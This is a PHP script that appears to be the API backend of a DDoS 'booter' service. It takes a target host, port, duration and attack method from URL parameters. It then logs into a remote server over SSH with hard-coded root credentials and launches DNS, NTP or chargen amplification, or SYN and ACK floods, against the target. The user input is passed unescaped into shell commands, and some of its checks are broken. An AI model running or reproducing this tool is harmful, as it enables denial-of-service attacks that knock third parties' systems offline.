// http://IP/api.php?key=key&host=host&port=port&time=time&method=method

<?php
ignore_user_abort(true);
set_time_limit(1000);
$server_ip = "1.3.3.7";  
$server_pass = "pass";  
$server_user = "root";  
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$array = array("ntp","chargen","dns","syn","ack");
$ray = array("password"); //This is your API password.
if (!empty($key)){
}else{
die('Error: API key is empty!');}
if (in_array($key, $ray)){
}else{
die('Error: Incorrect API key!');}
if (!empty($time)){
}else{
die('Error: time is empty!');}
if (!empty($host)){
}else{
die('Error: Host is empty!');}
if (!empty($method)){
}else{
die('Error: Method is empty!');}
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}	
if ($time > 1000){
die('Error: Cannot exceed 1000 seconds!');}  
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
if ($method == "dns") { $command = "/path/to/dns $host $port /path/to/d.txt 2 -1 $time"; }
if ($method == "chargen") { $command = "/path/to/chargen $host $port /path/to/c.txt 2 -1 $time"; }
if ($method == "ntp") { $command = "/path/to/ntp $host $port /path/to/n.txt 2 -1 $time"; }
if ($method == "ack") { $command = "/path/to/gem -T0 -h $host -t $time"; }
if ($method == "syn") { $command = "/path/to/gem -T3 -h $host -t $time"; }
if ($action == "stop") { $command = "pkill $host -f"; }
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
	echo "Error: Login failed, one or more of you're server credentials are incorrect.";
    } else {
	
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
			echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>